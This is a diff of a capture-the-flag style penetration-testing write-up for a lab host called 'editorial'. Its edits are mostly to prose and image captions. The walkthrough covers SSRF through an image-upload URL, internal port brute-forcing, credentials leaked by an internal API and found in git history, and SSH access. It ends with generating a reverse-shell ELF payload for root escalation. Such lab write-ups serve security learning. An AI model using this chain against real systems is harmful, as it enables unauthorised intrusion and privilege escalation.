@@ -27,17 +27,18 @@ Nmap done: 1 IP address (1 host up) scanned in 340.74 seconds
 
 The scan showed that two ports were open.
 
-The tester found a image upload feature that uses a URL to fetch the image. The tester was able to use this feature to access internal resources,  unintentionally exposed by the feature. The tester used the ZAP tool to brute force ports for open HTTP services. The tester selected the port portion of the address to be tested with all 65535 ports.
+The tester found a image upload feature that uses a URL to fetch the image. The tester was able to use this feature to access internal resources,  unintentionally exposed by the feature. The tester used the ZAP tool to brute force internal ports for open HTTP services. The tester selected the port portion of the address to be tested with all 65535 ports.
 
 
 
-![[Screenshot_2024-07-09_12-32-15.png]]
+--- Image of the ZAP indruder set up.
 
 
 
-![[Screenshot_2024-07-09_12-41-16.png]]
+--- Image of the results showing that port 5000 is open.
 
-The tester found that port 5000 returned a successful result. Downloading the file reveals the root page of an API. The Root page shows further pages. Testing the other pages, the tester.
+
+The tester found that port 5000 returned a successful result. Viewing the file reveals the root page of an API. The Root page shows further pages. Testing the other pages, the tester.
 
 ```
 {"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
@@ -53,7 +54,7 @@ The "http://127.0.0.1:5000/api/latest/metadata/messages/authors" end contains cr
 
 ```
 
-The tester used the credentials to log into the host. 
+The tester used the credentials to log into the host eith SSH.
 
 ```
 └─$ ssh dev@10.10.11.20
@@ -96,7 +97,6 @@ uid=1001(dev) gid=1001(dev) groups=1001(dev)
 ```
 
 
-
 The tester found a git repository in the "dev" home directory.  The tester checked the commits and found that the location where the "dev" credentials were found were previously the credentials for the "prod" account. 
 
 ```
@@ -130,7 +130,7 @@ index 61b786f..3373b14 100644
 
 ```
 
-The tester used these credentials to access the host as the "prod" account. The "prod" is able to run the "clone_prod_change" python script as root.
+The tester used these credentials to access the host as the "prod" account. The "prod" was able to run the "clone_prod_change" python script as root.
 
 ```
 prod@editorial:~$ sudo -l
@@ -169,10 +169,9 @@ No encoder specified, outputting raw payload
 Payload size: 130 bytes
 Final size of elf file: 250 bytes
 Saved as: reverse.elf
-                                                                                                                                           
+
 ┌──(kali㉿kali)-[~/Documents/editorial]]
 └─$ 
-
 ```
 
 
